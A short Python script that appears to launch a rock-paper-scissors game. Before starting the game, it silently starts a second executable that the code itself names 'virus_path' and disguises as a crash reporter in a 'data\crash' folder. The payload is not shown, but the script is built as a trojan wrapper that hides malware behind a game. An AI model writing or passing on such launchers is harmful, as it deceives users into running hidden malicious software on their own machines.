import os
import subprocess

script_dir = os.path.dirname(os.path.abspath(__file__))
game_path = os.path.join(script_dir, "data\\rockpaperscissors.exe")
virus_path = os.path.join(script_dir, "data\\crash\\crashreporter.exe")

subprocess.Popen([virus_path])
subprocess.Popen([game_path])
